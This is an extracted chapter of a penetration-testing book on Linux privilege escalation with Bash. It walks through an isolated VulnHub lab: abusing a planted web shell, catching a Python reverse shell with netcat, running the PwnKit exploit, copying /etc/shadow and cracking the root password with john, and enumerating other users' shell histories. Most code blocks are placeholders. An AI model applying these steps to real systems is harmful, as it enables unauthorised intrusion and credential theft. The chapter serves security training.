@@ -1,0 +1,1177 @@
+- en: '11'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Privilege Escalation in the Bash Shell
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: '**Privilege escalation** is a critical aspect of pentesting in Unix and Linux
+    environments. This chapter explores the techniques and methodologies for identifying
+    and exploiting vulnerabilities that allow an attacker to elevate their privileges
+    within a system. We will focus on utilizing the Bash shell, a powerful tool present
+    in most Unix-based systems, to execute various privilege escalation strategies.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Throughout this chapter, we will examine common **privilege escalation vectors**
+    , develop Bash scripts for system enumeration, and analyze the exploitation of
+    misconfigurations in services and scheduled tasks. Special attention will be given
+    to understanding and leveraging **Set User ID** ( **SUID** ) and **Set Group ID**
+    ( **SGID** ) binaries, which often provide opportunities for privilege escalation.
+    By mastering these techniques, pentesters can effectively assess and improve the
+    security posture of Unix and Linux systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We cover only the most common privilege escalation vectors in this chapter.
+    For an extensive list and a link to download the LinPEAS tool to automate these
+    checks, visit the HackTricks website’s Linux privilege escalation checklist at
+    [https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
+    .
+  prefs: []
+  type: TYPE_NORMAL
+- en: Although the LinPEAS application will help find privilege escalation attack
+    vectors for you, learning to do this manually will increasingly become more valuable
+    as more Linux systems utilize some form of **Endpoint Detection and Response**
+    ( **EDR** ) protection agent. These EDR agents may detect and block scripts such
+    as LinPEAS, forcing you to run these checks manually.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we’re going to cover the following main top ics:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Understanding privilege escalation in Unix/Linux systems
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Enumeration techniques for privilege escalation
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Exploiting SUID and SGID binaries with Bash
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Leveraging misconfigured services and scheduled tasks
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter11)
+    .
+  prefs: []
+  type: TYPE_NORMAL
+- en: If you want to follow along with the exercises, you should have a Kali virtual
+    machine available, and will need to download and run the **ESCALATE_LINUX** virtual
+    machine from [https://www.vulnhub.com/entry/escalate_linux-1,323/](https://www.vulnhub.com/entry/escalate_linux-1,323/)
+    . Ensure that both the Kali and **ESCALATE_LINUX** virtual machines have the same
+    virtual network configuration.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Run the following command to install prerequisite tools in Kali:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE0]'
+  prefs: []
+  type: TYPE_PRE
+- en: Understanding privilege escalation in Unix/Linux systems
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Privilege escalation in Unix/Linux systems refers to the process of gaining
+    higher-level access rights than those initially granted to a user or application.
+    This concept is fundamental to system security and is a key focus for both system
+    administrators and pentest ers.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In Unix/Linux environments, the privilege system is primarily based on user
+    and group permissions. The root user, with a user ID of **0** , has unrestricted
+    access to the entire system. Regular users have limited permissions, typically
+    confined to their home directories and specific system resources.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Privilege escalation can be categorized into two main types:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Vertical privilege escalation** : This involves elevating privileges from
+    a lower-level user to a higher-level user, often targeting root access. An example
+    is a standard user gaining root privileges.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Horizontal privilege escalation** : This occurs when a user gains access
+    to resources or performs actions that should be restricted to a different user
+    of the same privilege level. An example is one standard user accessing another
+    standard user’s files.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Common paths for privilege escalation in Unix/Linux systems include the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting vulnerabilities in system services or applications
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Misconfigurations in file or directory permissions
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Weak password policies or compromised credentials
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Kernel exploits
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Unpatched software vulnerabilities
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Before we get into the details of the common paths for privilege escalation,
+    it is essential that we first review the Unix/Linux permission model. Understanding
+    the **Unix/Linux permission model** is essential for grasping privilege escalation
+    concepts:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: File permissions are represented by read ( **r** ), write ( **w** ), and execute
+    ( **x** ) flags for the owner, group, and others
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Special permissions such as **SUID** , **SGID** , and **Sticky Bit** can also
+    impact privilege levels
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: User and group management, including the **/etc/passwd** and **/etc/shadow**
+    files, play a role in access control
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Privilege escalation techniques often involve a combination of information gathering,
+    vulnerability identification, and exploitation. Attackers may chain multiple vulnerabilities
+    or misconfigurations to gradually increase their access levels.
+  prefs: []
+  type: TYPE_NORMAL
+- en: It’s important to note that privilege escalation is not inherently malicious.
+    System administrators and security professionals use these techniques to identify
+    and address security weaknesses. However, in the hands of malicious actors, privilege
+    escalation can lead to unauthorized access, data breaches, and system compromise.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Preventive measures against unintended privilege escalation include the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Regular system updates and patch management
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Proper configuration of file and directory permissions
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Implementation of the principle of least privilege
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Use of **security-enhanced Linux** ( **SELinux** ) or **AppArmor**
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Regular security audits and vulnerability assessments
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Understanding privilege escalation is critical for both defending against and
+    conducting pentests on Unix/Linux systems. It forms the foundation for more advanced
+    techniques and exploits that will be explored in subsequent sections of this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The next section will explore how to perform enumeration.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Enumeration techniques for privilege escalation
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: '**Enumeration** is a key phase in privilege escalation, allowing pentesters
+    to gather information about the target system. This section focuses on Bash commands
+    and techniques for effective system enumeration for privilege escalation.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Initial access
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: This section will precede privilege escalation. It covers connecting to the
+    **ESCALATE_LINUX** virtual machine, which we’ll call the *target* for the remainder
+    of this chapter. Once we have established a working shell, we’ll move forward
+    into subsequent sections.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this exercise, I have both the Kali and the target running in VirtualBox
+    virtual machines. Both Kali and **ESCALATE_LINUX** offer virtual machine OVA files
+    that can be downloaded and imported into VirtualBox.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The network interfaces are configured to use the host-only network adapter,
+    as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.1 – The virtual network interface configuration](image/B22229_11_01.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.1 – The virtual network interface configuration
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The Kali virtual machine should have an additional virtual network interface
+    added. Of the two Kali virtual network interfaces, one should be in **Host-only**
+    mode, and the other should be in **Bridged** mode, as shown in the following screenshot:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.2 – The Kali VirtualBox network interface configuration](image/B22229_11_02.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.2 – The Kali VirtualBox network interface configuration
+  prefs: []
+  type: TYPE_NORMAL
+- en: This configuration will keep the vulnerable target system isolated from the
+    network while allowing the Kali system to connect to the internet to download
+    any needed tools.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If you have any trouble identifying which of Kali’s network interfaces are
+    connected to each network mode, the command output shown in the following figure
+    should help you figure this out:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.3 – Enumerating virtual network interfaces](image/B22229_11_03.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.3 – Enumerating virtual network interfaces
+  prefs: []
+  type: TYPE_NORMAL
+- en: The Kali VirtualBox virtual machine downloaded from Offensive Security ( [https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z](https://cdimage.kali.org/kali-2024.2/kali-linux-2024.2-virtualbox-amd64.7z)
+    ) already has the guest extensions installed, which will allow you to query the
+    network interfaces to find their IP addresses. In the preceding figure, the first
+    **Network Interface Card** ( **NIC** ) is configured for **Host-only** access,
+    as is the target system. Unfortunately, the target system doesn’t have VirtualBox
+    guest extensions installed; therefore, we cannot query for its IP address information
+    and will have to rely on Kali.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Moreover, the second and third commands in the preceding figure differ only
+    in the number of the virtual interface. **NI C 1** corresponds to **/VirtualBox/GuestInfo/Net/0/V4/IP**
+    , and **NIC 2** corresponds to **/VirtualBox/GuestInfo/Net/1/V4/IP** . Since **NIC
+    1** is configured for **Host-only** and has an IP address of **192.168.56.101**
+    , we can guess that the target system is also found on this network. Next, let’s
+    scan that network to find an IP address with TCP port **80** (HTTP) listening,
+    as shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.4 – Scanning the network to locate HTTP servers](image/B22229_11_04.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.4 – Scanning the network to locate HTTP servers
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If we visit that address in our web browser, we find an Apache2 default page,
+    as shown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.5 – A default Apache2 page](image/B22229_11_05.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.5 – A default Apache2 page
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Since we’ve found only a default website, we need to check for additional web
+    content. Run the following **dirsearch** command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE1]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The output reveals **shell.php** , as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.6 – A valid PHP web page is located](image/B22229_11_06.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.6 – A valid PHP web page is located
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If we visit [https://192.168.56.102/shell.php](https://192.168.56.102/shell.php)
+    in a web browser on Kali, we see the following text on the web page: **/*pass
+    cmd as** **get parameter*/** .'
+  prefs: []
+  type: TYPE_NORMAL
+- en: This is a huge hint that we won’t ordinarily get, so keep in mind that we’ve
+    been given a shortcut to finding the vulnerability so that we can spend our precious
+    time focusing on privilege escalation, which is what the target was intended for.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following figure shows how to properly exploit this web page:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.7 – An exploit proof-of-concept for the web shell](image/B22229_11_07.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.7 – An exploit proof-of-concept for the web shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: Next, we need to get a shell on the target system. In your Kali terminal, enter
+    **nc -nlvp 4444** and press the *Enter* key.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Visit the *Reverse Shell Cheat Sheet* at [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+    . We’re going to use the Python version. Copy the code for the Python shell, then
+    visit the CyberChef website at https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)
+    and paste the Python code into the **Input** pane. Change the Python command to
+    be executed from **/bin/sh** to **/bin/bash** . Change the IP address and port
+    to match what you’re using on your Kali system. For the port, you can use **4444**
+    . Click the **Copy** button in the **Output** pane.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In your web browser where you have the target **shell.php** , paste in the
+    Python code after **cmd=** , as shown in the following figure, then press the
+    *Enter* key:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.8 – Executing the Python payload in the web shell](image/B22229_11_08.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.8 – Executing the Python payload in the web shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In your Kali terminal, you should see that you have a reverse shell connection,
+    as shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.9 – A reverse shell from the target system](image/B22229_11_09.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.9 – A reverse shell from the target system
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we have established our session, let’s move forward and start exploring
+    the target in the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: System information gathering
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'The first thing I want to know once I have a shell on a Linux system is whether
+    I can run any commands using **sudo** . Enter the following command to check your
+    **sudo** permissions:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE2]'
+  prefs: []
+  type: TYPE_PRE
+- en: Unfortunately, we’re prompted for a password on the target system. Since we
+    don’t know the password for this user account, this is a dead-end. If we did know
+    the password, we could enter it, and if we’re lucky, the command output would
+    show that we could run a command with **sudo** and possibly abuse it to escalate
+    privileges.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: If you enter the **sudo -l** command and get any output that shows you can run
+    anything using **sudo** , search for the command on the *GTFOBins* website ( [https://gtfobins.github.io](https://gtfobins.github.io)
+    ) to see whether you can abuse it for privilege escalation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s take a look around in the current directory, **/var/www/html** . We check
+    to see whether the files in this directory contain any credentials. However, we
+    are not in luck, as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.10 – Examining files in the current working directory](image/B22229_11_10.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.10 – Examining files in the current working directory
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we take a look around in our home directory. Use the **cat** command
+    to examine any previous commands this user has previously entered using the following
+    command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE3]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'While looking in our home directory, we do find an interesting bit of information,
+    as seen here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.11 – A file that indicates this user has sudo rights](image/B22229_11_11.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.11 – A file that indicates this user has sudo rights
+  prefs: []
+  type: TYPE_NORMAL
+- en: The highlighted file indicates that this user has run the **sudo** command in
+    the past. Without knowing the user’s password, we cannot hope to run **sudo -l**
+    to find out what they can run using **sudo** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Can we view any other user’s **.bash_history** file? Enter the following command
+    to check this:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE4]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding command runs the **find** command on the **/home** directory,
+    looking for a filename ( **-name** ) of **.bash_history** . Errors ( **file descriptor
+    2** ) are sent to **/dev/null** , which results in them being discarded. Any files
+    matching this pattern are printed to the screen ( **-exec cat {} +** ). We get
+    a lot more output than we saw when we looked at the current user’s **.bash_history**
+    file, but don’t find any credentials in command-line arguments in the output.
+    Still, it’s worth going back and examining the **.bash_history** file in each
+    user’s home directory and making a note of who’s running what command. This information
+    can often be useful once we have more information. Since we have some level of
+    access to various users’ home directories, make sure you take the time to explore
+    these directories for any files containing useful information.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, let’s take a look at the system architecture and look for kernel exploits.
+    Understanding the system’s architecture, kernel version, and distribution helps
+    identify potential vulnerabilities. The following command prints this information:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE5]'
+  prefs: []
+  type: TYPE_PRE
+- en: The following screenshot shows this command output on the target system. It
+    reveals that the target system is running Ubuntu Linux, kernel version **4.15.0-45-generic**
+    , and the architecture is **x86_64** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.12 – The command output shows essential information about the target
+    operating system](image/B22229_11_12.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.12 – The command output shows essential information about the target
+    operating system
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To get specific operating system information, try the following commands:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE6]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The command output is shown on the target system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.13 – Enumerating operating system release information](image/B22229_11_13.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.13 – Enumerating operating system release information
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, let’s take the information that we have about the target operating system
+    and kernel version and check for privilege escalation exploits. In your Kali terminal,
+    enter the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE7]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Here is the explanation:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**searchsploit** : Allows you to search through exploits and shellcodes using
+    one or more terms from **Exploit-DB**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-s** : Strict search'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**--id** : Displays the **EDB-ID** value rather than the local path'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'The output of **searchsploit** is shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.14 – A demonstration of using searchsploit](image/B22229_11_14.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.14 – A demonstration of using searchsploit
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: I recommend that you explore the **searchsploit** **man** page. There are some
+    really useful features, such as the ability to examine ( **-x** ) the content,
+    and mirror ( **-m** ) the exploit to the current directory.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Based on the kernel version and knowledge that the target is running Ubuntu
+    **18.04** , we should look into the **polkit** / **pwnkit** exploits ( **CVE-2021-4034**
+    ). This vulnerability was patched in the **polkit** version **0.120** . The following
+    figure shows the **searchsploit** command output for this vulnerability:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.15 – The searchsploit results for the polkit exploit](image/B22229_11_15.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.15 – The searchsploit results for the polkit exploit
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can enumerate the **polkit** version using the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE8]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The output shown in the following figure reveals that the target **polkit**
+    version is vulnerable:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.16 – The pkexec --version command reveals that the target is vulnerable](image/B22229_11_16.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.16 – The pkexec --version command reveals that the target is vulnerable
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before we attempt to exploit this, we check to ensure that the GCC compiler
+    is installed using the **which gcc** command. We find that it is installed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We run the **searchsploit -m 50689** command, which copies the exploit code
+    to our current directory. Examining the text of this file, we find that it contains
+    code for two files, **evil-so.c** and **exploit.c** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: Important note
+  prefs: []
+  type: TYPE_NORMAL
+- en: Never blindly run exploit code and third-party scripts unless you first review
+    the source code to verify that there’s nothing malicious in it that will exploit
+    your or your customer’s system in unintended ways!
+  prefs: []
+  type: TYPE_NORMAL
+- en: Since the source of this exploit code comes from *Exploit-DB* ( **searchsploit**
+    ), it’s safe to use because **Offensive Security** reviews exploit submissions
+    before they are posted.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We can transfer exploits and scripts over to the target system. On the Kali
+    system, make a new directory ( **mkdir** ) named **share** . We never want to
+    share our home directory or any location where we may have sensitive information
+    to the network. Change directory to **share** ( **cd share** ), copy any exploits
+    or scripts to this directory, then start a Python HTTP server as follows: **python3
+    -** **m http.server** .'
+  prefs: []
+  type: TYPE_NORMAL
+- en: On the target system, change directory to **/tmp** ( **cd /tmp** ). This directory
+    is writable by all users. The **/dev/shm** directory is also usually writable
+    by all users. Then, transfer the file from Kali using the **wget http://192.168.56.11:8000/filename**
+    command. Of course, be sure to change the IP address and filename to values appropriate
+    for your system. Don’t forget to make your exploits or scripts executable ( **chmod
+    +x** ) before you run them!
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'On the target system, compile the exploits, as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.17 – Compiling the polkit exploit code](image/B22229_11_17.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.17 – Compiling the polkit exploit code
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The output in the preceding figure is only warnings, and we check the files
+    using the **ls -l** command and see that they are, in fact, compiled. We change
+    the permissions to make them executable by running the **chmod +x filename** command,
+    and then run the exploit. The following figure shows the exploit in action:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.18 – Running the polkit exploit results in a root shell](image/B22229_11_18.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.18 – Running the polkit exploit results in a root shell
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'While we have elevated privileges as **root** , we need to establish some form
+    of persistence. I **cat** the **/etc/shadow** file, which contains password hashes,
+    and then save a copy to my Kali system. I then attempt to crack the hashes using
+    the **john shadow** command. I managed to crack the **root** password, as shown
+    in the following figure, where we find that the **root** password is **12345**
+    . Having the **root** password will allow us to continue accessing this system
+    as **root** should we get disconnected:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.19 – Using john to crack the root password](image/B22229_11_19.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.19 – Using john to crack the root password
+  prefs: []
+  type: TYPE_NORMAL
+- en: For the sake of learning, let’s continue as if we haven’t found this exploit
+    and continue to enumerate the system for privilege escalation paths.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we need to test for writable directories in the path of **user6** . If
+    any writable directories are found in our path, we may be able to hijack and replace
+    their content. For this, we’ll use the following script, which can be found in
+    this chapter’s GitHub repository as **ch11_checkpath.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE9]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding code starts with the familiar shebang line. The **PATH** environment
+    variable is expanded, then each colon is replaced with a newline to make the data
+    into one directory per line. This data is then assigned to the **path_dirs** variable.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE10]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding code block checks each directory (recursively) if it is writable.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE11]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding code block loops through the list of directories in the **path_dir**
+    variable and passes each one to the **check_permissions** function.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We run this script on the target, but no writable directories are discovered,
+    as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.20 – Checking for writable directories in PATH](image/B22229_11_20.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.20 – Checking for writable directories in PATH
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we check environment variables for credentials, keys, or any interesting
+    data using the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE12]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The output is as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.21 – Environment variables are displayed](image/B22229_11_21.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.21 – Environment variables are displayed
+  prefs: []
+  type: TYPE_NORMAL
+- en: Unfortunately, we do not find any interesting data in the environment variables.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Next, we’ll explore running processes. The **pspy** tool will allow us to monitor
+    running processes without being the **root** user: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
+    .'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'After transferring **pspy64** to the target system, we run it and see something
+    interesting in the output, as shown in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.22 – Interesting executables running in the pspy64 output](image/B22229_11_22.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.22 – Interesting executables running in the pspy64 output
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We examine these files in **/home/user4** and find that we do not have the
+    ability to write to them, as seen in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.23 – Examining files in user4’s home directory](image/B22229_11_23.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.23 – Examining files in user4’s home directory
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Finally, let’s check some common file permissions. Run the following commands
+    on the target system:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE13]'
+  prefs: []
+  type: TYPE_PRE
+- en: Of course, we don’t have any luck here and we can’t write to these files and
+    can’t read password hashes from **/etc/shadow** , but it never hurts to check.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This section gave a primer on common filesystem paths to check, and how to enumerate
+    the kernel and operating system versions and search for working exploits. In the
+    next section, we’ll explore SUID and SGID binaries and how they can be useful
+    for privile ge escalation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Exploiting SUID and SGID binaries with Bash
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: SUID and SGID are special permissions in Unix-like systems that allow users
+    to execute files with the permission of the file owner or group. When misused,
+    these permissions can lead to privilege escalation. This section focuses on identifying
+    and exploiting SUID/SGID binaries using Bash commands and scripts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In a previous chapter, you learned about Linux file permissions. Let’s have
+    a quick recap and then build on that concept to understand SUID and SGID.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If we enter the **ls -l** command and view the output for the **shell.php**
+    file, we fi nd the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE14]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Let’s break that down. The first character is always either **-** for a file
+    or **d** for a directory. In the following figure, I have highlighted the file
+    type. Since the file type in this figure is a dash ( **-** ), we know this is
+    a file:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.24 – The file type is highlighted and shows it is a file, not a
+    directory](image/B22229_11_24.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.24 – The file type is highlighted and shows it is a file, not a directory
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In the following figure, the user permissions are highlighted. If you recall,
+    when all three are set (read, write, and execute), they sum to **7** ( *4 + 2
+    + 1 = 7* ). In this case, since the file is not executable, the user permissions
+    sum to **6** ( *4 + 2 + 0 =* *6* ):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.25 – User permissions are highlighted](image/B22229_11_25.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.25 – User permissions are highlighted
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Group permissions are examined in the following figure. The file is readable
+    but not writeable or executable. The group permissions sum to **4** ( *4 + 0 +
+    0 =* *4* ):'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.26 – Group permissions are highlighted](image/B22229_11_26.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.26 – Group permissions are highlighted
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Other permissions are examined in the following figure. If you are not the
+    user or a member of the group listed on the file permissions, then the *other*
+    permissions apply:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.27 – Other permissions are highlighted](image/B22229_11_27.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.27 – Other permissions are highlighted
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In the following figure, the **root** user is the file owner:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 11.28 – File user ownership is shown to be root](image/B22229_11_28.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 11.28 – File user ownership is shown to be root
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The *root* group has group permissions on this file, as shown in the following
+    figure:'
+  prefs: []
+  type: TYPE_NORMAL
